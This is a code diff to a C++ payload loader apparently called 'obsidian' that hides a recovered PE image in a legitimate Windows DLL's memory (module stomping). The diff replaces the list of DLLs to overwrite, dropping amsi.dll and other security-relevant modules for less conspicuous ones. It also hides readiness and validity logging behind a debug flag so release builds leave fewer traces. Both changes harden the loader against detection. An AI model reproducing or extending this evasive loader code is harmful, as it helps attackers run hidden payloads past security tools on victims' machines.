@@ -254,14 +254,13 @@ bool	recover_payload(std::string &stored, PackedFooter &footer, std::string &pay
 */
 const char *const	g_stomp_candidates[] =
 {
-	"dbghelp.dll",
-	"amsi.dll",
-	"wintrust.dll",
-	"msi.dll",
-	"wldap32.dll",
-	"winhttp.dll",
-	"version.dll",
-	"crypt32.dll"
+	"userenv.dll",
+	"profapi.dll",
+	"d3d11.dll",
+	"textinputframework.dll",
+	"windows.storage.dll",
+	"msimg32.dll",
+	"version.dll"
 };
 
 const size_t	g_stomp_candidate_count = sizeof(g_stomp_candidates) / sizeof(g_stomp_candidates[0]);
@@ -1198,7 +1197,9 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 	size_t	resolved_funcs;
 	size_t	unwind_count;
 	bool	structure_ok;
+#ifdef OBSIDIAN_DEBUG
 	std::string	readiness;
+#endif
 
 	structure_ok = true;
 	{
@@ -1355,12 +1356,14 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 			}
 		}
 	}
+#ifdef OBSIDIAN_DEBUG
 	std::string	validity;
 
 	if (structure_ok)
 		validity = "valid";
 	else
 		validity = "INVALID";
+#endif
 	uint32_t	directory_count2 = read_uint32_le(payload.data() + optional_offset + 108);
 	if (directory_count2 > 9)
 	{
@@ -1406,6 +1409,7 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 			}
 		}
 	}
+#ifdef OBSIDIAN_DEBUG
 	if (GetProcessHeap() == NULL || GetCommandLineA() == NULL)
 		readiness = "not ready: environment incomplete";
 	else if (!tls_ready)
@@ -1422,6 +1426,10 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 	OBSIDIAN_LOG("obsidian: readiness: " << readiness << "\n");
 	if (delay_dlls != 0)
 		OBSIDIAN_LOG("obsidian: " << delay_dlls << " delay import descriptor(s) found\n");
+#else
+	(void)tls_ready;
+	(void)delay_dlls;
+#endif
 	return (structure_ok);
 }
 // Call original TLS callbacks before the entry point.
